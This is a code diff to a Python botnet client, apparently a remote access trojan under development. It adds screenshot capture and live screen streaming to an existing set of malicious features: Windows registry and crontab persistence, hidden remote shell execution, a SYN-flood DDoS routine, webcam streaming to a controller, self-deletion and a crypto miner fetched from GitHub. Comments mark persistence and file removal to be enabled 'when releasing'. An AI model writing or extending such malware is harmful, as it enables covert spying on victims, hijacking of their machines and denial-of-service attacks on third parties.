@@ -9,6 +9,8 @@ import ipaddress
 import struct
 import subprocess
 import cv2
+import pyautogui
+import numpy as np
 
 HOST, PORT = ('127.0.0.1', 80)
 
@@ -20,11 +22,11 @@ def get_arg(tokens:list, arg_token:str):
 
 async def setup():
     await try_connect_to_server()
-    #get_persistance_and_admin()
+    #get_persistance_and_admin() #! REMOVE WHEN '#' RELEASE
 
+# Startup + admin priv for windows and unix systems
 def get_persistance_and_admin():
     if os.name == "nt":
-        #! Startup + admin priv for windows systems
         
         # Set up keys and paths
         key = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -62,9 +64,7 @@ def get_persistance_and_admin():
                     print(f"{app_name} will run on startup, but it doesn't have admin privileges.")
             except Exception as e:
                 print(f"Error occurred: {e}")
-    else:
-        #! Startup + sudo priv for unix systems
-        
+    else:        
         # Get the script added to startup
         script_path = os.path.abspath(sys.argv[0])
         # Add the script to the user's crontab to run at startup
@@ -103,7 +103,9 @@ async def try_connect_to_server():
     
 # Ran when the client is connected to the server, this function handles all the comms
 async def connected_to_server():
-    stream_cam_task:asyncio.Task
+    stream_cam_task_flag = asyncio.Event()
+    stream_screen_task_flag = asyncio.Event()
+    
     
     # Check for messages from the server
     while True:
@@ -121,28 +123,46 @@ async def connected_to_server():
         
         # All the commands are run from here
         if command == "delete_self":
-            writer.close()
-            await writer.wait_closed()
-            delete_self()
+            await delete_self()
+        
         elif command == "flood":
             flood_task = asyncio.create_task(flood(tokens))
+        
         elif command == "stop_flood":
             flood_task.cancel()
             await flood_task
+        
         elif command == "shell":
             tokens = tokens[1:]
             await shell(tokens)
+        
         elif command == "stream_cam":
-            stream_cam_task = asyncio.create_task(stream_cam())
+            stream_cam_task_flag.clear()
+            asyncio.create_task(stream_cam(stream_cam_task_flag))
+        
         elif command == "stop_stream_cam":
-            if stream_cam_task:
-                stream_cam_task.cancel()
-        elif command == "miner":
+            stream_cam_task_flag.set()
+        
+        elif command == "miner": 
             miner(tokens)
+        
+        elif command == "screenshot":
+            await take_screenshot()
             
-def delete_self():
+        elif command == "stream_screen":
+            stream_screen_task_flag.clear()
+            asyncio.create_task(stream_screen(stream_screen_task_flag))
+            
+        elif command == "stop_stream_screen":
+            stream_screen_task_flag.set()
+
+# Incase the server removes the client from the botnet, then delete the file + forceclose the program          
+async def delete_self():
+    writer.close()
+    await writer.wait_closed()
     self_path = os.path.realpath(__file__)
-    os.remove(self_path)
+    #os.remove(self_path) #! REMOVE # WHEN WHEN RELEASING
+    os._exit(0)
             
 # Can be used for a DDos attack
 async def flood(tokens:list):
@@ -173,29 +193,33 @@ async def flood(tokens:list):
             print(f"Error sending SYN packet: {e}")
         except asyncio.CancelledError:
             print("Flooding was stopped by the server")
-        
         await asyncio.sleep(0.01)
 
 # Stream the webcam via OpenCv, then encode to .jpg, then write to server
-async def stream_cam():
+async def stream_cam(stop_flag:asyncio.Event):
     try:
+        # Captures the webcam
         cap = cv2.VideoCapture(0)
         
-        while True:
+        # If the stop_flag.is_set() == true, then the camera should stop streaming
+        while not stop_flag.is_set():
             ret, frame = cap.read()
 
+            # If there is nothing captured it should break the while loop
             if not ret:
                 break
             
+            # Encode the frame and convert it to bytes
             _, encoded_frame = cv2.imencode(".jpg", frame)
             frame_bytes = encoded_frame.tobytes()
             
-            # Setup header with the frame
+            # Create the net packet and send to the server
             header = f"stream-cam-marker:byte-length:{len(frame_bytes)}".encode()
             data = header + b"\n" + frame_bytes
             writer.write(data)
             await writer.drain()
     except Exception as e:
+        print(e)
         pass
 
 # Running and sending the output of shell commands
@@ -203,23 +227,28 @@ async def shell(tokens:list):
     command = " ".join(tokens)
     
     try: 
+        # Try running the shell command that the server has sent
         result = subprocess.run(f"cmd.exe /C {command}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
         stdout = result.stdout
         stderr = result.stderr
         server_response = ""
-                
+        
+        # Formatting the response
         for line in stdout.splitlines():
             server_response += "\r\n" + line
-            
+        
+        # If there is an error, pass to the exception
         if stderr:
             server_response = stderr
             pass
         
+        # Create and send the net packet, to the server
         header = f"shell-marker:byte-length:{len(server_response.encode())}"
         data = f"{header}\n{server_response}".encode()
         writer.write(data)
         await writer.drain()
     except Exception as e:
+        # If 'stderr' is not NONE then send it as an error instead
         print(e)
         writer.write("Does not exist".encode())
         await writer.drain()
@@ -227,30 +256,75 @@ async def shell(tokens:list):
 # Set up and run a crypto miner
 def miner(tokens:list):
     try:
+        # Check if git works
         result = subprocess.run(['git', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         
         if result == False:
             subprocess.run("winget install --id Git.Git -e --source winget")
-            
+        
+        # Clone the github miner project
         subprocess.run("git clone https://github.com/Lucas310302/Coin-Nest")
         if tokens > 0:
             run_command = f"Coin-Nest/main.py {tokens[1]}"
         else:
             run_command = f"Coin-Nest/main.py"
         
+        # Check if there is a token attached or not
         subprocess.run(run_command)
         
+        # Create the net packet and send to server
         header = f"miner-marker:byte-length:0"
         response = "Miner Setup and running"
         data = f"{header}\n{response}"
         writer.write(data.encode())
         writer.drain()
     except Exception as e:
-        reponse = f"Miner Error {e}"
-        data = f"{header}\n{response}"
+        # Incase of error, send the error to the server
+        erorr_reponse = f"Miner Error: {e}"
+        data = f"{header}\n{erorr_reponse}"
         writer.write(data.encode())
         writer.drain()  
         print(e)
+
+# Grab a screenshot and send it to the server     
+async def take_screenshot():
+    try:
+        # Grab a screenshot the convert it to a format Opencv can work with
+        frame = pyautogui.screenshot()
+        frame = cv2.cvtColor(np.array(frame), cv2.COLOR_RGB2BGR)
+        
+        # Convert the opencv image to bytes
+        _, encoded_frame = cv2.imencode(".jpg", frame)
+        frame_bytes = encoded_frame.tobytes()
+        
+        # Create net packet and send to server
+        header = f"screenshot-marker:byte-length:{len(frame_bytes)}".encode()
+        data = header + b"\n" + frame_bytes
+        writer.write(data)
+        await writer.drain()
+    except Exception as e:
+        print(e)
+        
+async def stream_screen(stop_flag:asyncio.Event):
+    try:
+        while not stop_flag.is_set():
+            # Grab screenshot and convert to OpenCV format
+            frame = pyautogui.screenshot()
+            frame = cv2.cvtColor(np.array(frame), cv2.COLOR_RGB2BGR)
+            
+            # Convert image to bytes
+            _, encoded_frame = cv2.imencode(".jpg", frame)
+            frame_bytes = encoded_frame.tobytes()
+            
+            # Create net packet and send to server
+            header = f"stream-screen-marker:byte-length:{len(frame_bytes)}".encode()
+            data = header + b"\n" + frame_bytes
+            writer.write(data)
+            await writer.drain()
+    except Exception as e:
+        print(e)
+            
+            
 
 if __name__ == "__main__":
     asyncio.run(setup())
